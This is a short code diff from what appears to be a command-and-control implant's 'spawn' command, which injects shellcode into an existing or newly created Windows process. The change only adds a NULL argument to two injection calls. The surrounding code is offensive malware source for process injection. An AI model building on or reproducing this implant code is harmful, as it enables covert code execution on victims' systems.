@@ -16,7 +16,7 @@ VOID cmd_spawn(PINSTANCE inst, PPARSER args, PPACKAGE response) {
     }
 
     if (pid != 0) {
-        if (inject_shellcode(inst, pid, sc, sc_len)) {
+        if (inject_shellcode(inst, pid, sc, sc_len, NULL)) {
             package_add_string(inst, response, XSTR("injected into process"));
         } else {
             package_add_string(inst, response, XSTR("injection failed"));
@@ -62,7 +62,7 @@ VOID cmd_spawn(PINSTANCE inst, PPARSER args, PPACKAGE response) {
         return;
     }
 
-    HANDLE hThread = inject_shellcode_into(inst, pi.hProcess, sc, sc_len);
+    HANDLE hThread = inject_shellcode_into(inst, pi.hProcess, sc, sc_len, NULL);
     if (!hThread) {
         inst->Win32.TerminateProcess(pi.hProcess, 1);
         gate_CloseHandle(inst, pi.hThread);
